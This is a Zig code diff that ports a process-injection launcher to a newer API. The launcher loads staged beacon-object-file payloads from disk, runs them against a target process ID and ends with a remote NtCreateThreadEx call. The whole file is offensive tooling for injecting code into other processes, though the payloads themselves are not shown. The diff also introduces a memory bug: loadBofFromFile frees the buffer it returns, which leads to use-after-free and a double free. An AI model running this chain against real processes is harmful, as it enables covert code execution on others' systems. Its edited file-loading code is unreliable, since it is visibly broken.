@@ -8,54 +8,51 @@ pub const std_options = std.Options{
     .log_level = .info,
 };
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
+pub fn main(init: std.process.Init) !void {
+    const allocator = init.gpa;
+    const arena = init.arena.allocator();
+    const io = init.io;
 
-    var cmd_args_iter = try std.process.argsWithAllocator(allocator);
-    defer cmd_args_iter.deinit();
-
-    _ = cmd_args_iter.next() orelse unreachable;
-    const pid_str = cmd_args_iter.next() orelse {
-        try usage();
+    const cmdline_args = (try init.minimal.args.toSlice(arena))[1..];
+    if (cmdline_args.len != 1) {
+        usage();
         return;
-    };
-    const pid = try std.fmt.parseInt(u32, pid_str, 10);
+    }
+    const pid = try std.fmt.parseInt(u32, cmdline_args[0], 10);
 
     try bof.initLauncher();
     defer bof.releaseLauncher();
 
     const bof_clone_process = blk: {
-        const coff = try loadBofFromFile(allocator, "wCloneProcess");
+        const coff = try loadBofFromFile(allocator, io, "wCloneProcess");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
     defer bof_clone_process.release();
 
     const bof_stage0 = blk: {
-        const coff = try loadBofFromFile(allocator, "wInjectionChainStage0");
+        const coff = try loadBofFromFile(allocator, io, "wInjectionChainStage0");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
     defer bof_stage0.release();
 
     const bof_stage1 = blk: {
-        const coff = try loadBofFromFile(allocator, "wInjectionChainStage1");
+        const coff = try loadBofFromFile(allocator, io, "wInjectionChainStage1");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
     defer bof_stage1.release();
 
     const bof_stage2 = blk: {
-        const coff = try loadBofFromFile(allocator, "wInjectionChainStage2C");
+        const coff = try loadBofFromFile(allocator, io, "wInjectionChainStage2C");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
     defer bof_stage2.release();
 
     const bof_stage3 = blk: {
-        const coff = try loadBofFromFile(allocator, "wInjectionChainStage3");
+        const coff = try loadBofFromFile(allocator, io, "wInjectionChainStage3");
         defer allocator.free(coff);
         break :blk try bof.Object.initFromMemory(coff);
     };
@@ -86,7 +83,7 @@ pub fn main() !void {
     const ctx_stage0 = try bof_stage0.run(args.getBuffer());
     defer ctx_stage0.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
-    if (state.nt_status != .SUCCESS) return;
+    if (state.nt_status != w32.STATUS_SUCCESS) return;
 
     {
         const ctx = try bof_clone_process.run(null);
@@ -97,7 +94,7 @@ pub fn main() !void {
     const ctx_stage1 = try bof_stage1.run(args.getBuffer());
     defer ctx_stage1.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
-    if (state.nt_status != .SUCCESS) return;
+    if (state.nt_status != w32.STATUS_SUCCESS) return;
 
     {
         const ctx = try bof_clone_process.run(null);
@@ -108,7 +105,7 @@ pub fn main() !void {
     const ctx_stage2 = try bof_stage2.run(args.getBuffer());
     defer ctx_stage2.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
-    if (state.nt_status != .SUCCESS) return;
+    if (state.nt_status != w32.STATUS_SUCCESS) return;
 
     {
         const ctx = try bof_clone_process.run(null);
@@ -119,15 +116,13 @@ pub fn main() !void {
     const ctx_stage3 = try bof_stage3.run(args.getBuffer());
     defer ctx_stage3.release();
     std.debug.print("nt status: {d}\n", .{state.nt_status});
-    if (state.nt_status != .SUCCESS) return;
+    if (state.nt_status != w32.STATUS_SUCCESS) return;
 
     {
         const ctx = try bof_clone_process.run(null);
         defer ctx.release();
         if (ctx.getExitCode() == 0) return;
     }
-
-    w32.init();
 
     var thread_handle: w32.HANDLE = undefined;
     state.nt_status = w32.NtCreateThreadEx(
@@ -149,8 +144,9 @@ pub fn main() !void {
     _ = w32.NtClose(thread_handle);
 }
 
-fn loadBofFromFile(allocator: std.mem.Allocator, bof_name: [:0]const u8) ![]const u8 {
+fn loadBofFromFile(allocator: std.mem.Allocator, io: std.Io, bof_name: []const u8) ![]const u8 {
     const pathname = try std.mem.join(allocator, ".", &.{
+        "bofs/",
         bof_name,
         if (@import("builtin").os.tag == .windows) "coff" else "elf",
         switch (@import("builtin").cpu.arch) {
@@ -164,27 +160,21 @@ fn loadBofFromFile(allocator: std.mem.Allocator, bof_name: [:0]const u8) ![]cons
     });
     defer allocator.free(pathname);
 
-    var bof_path: [std.fs.max_path_bytes:0]u8 = undefined;
-    const absolute_bof_path = try std.fs.cwd().realpath(pathname, bof_path[0..]);
-    bof_path[absolute_bof_path.len] = 0;
+    const file = try std.Io.Dir.openFile(.cwd(), io, pathname, .{});
+    defer file.close(io);
 
-    const file = try std.fs.openFileAbsoluteZ(&bof_path, .{});
-    defer file.close();
-
-    const file_stat = try file.stat();
+    const file_stat = try file.stat(io);
     const file_data = try allocator.alloc(u8, @intCast(file_stat.size));
-    errdefer allocator.free(file_data);
+    defer allocator.free(file_data);
 
-    var file_reader = file.reader(&.{});
+    var file_reader = file.reader(io, &.{});
     try file_reader.interface.readSliceAll(file_data);
+
     return file_data;
 }
 
-fn usage() !void {
-    var stdout_writer = std.fs.File.stdout().writer(&.{});
-    const stdout = &stdout_writer.interface;
-
-    try stdout.print(
+fn usage() void {
+    std.log.info(
         \\
         \\ USAGE:
         \\      process_injection_chain <PID>
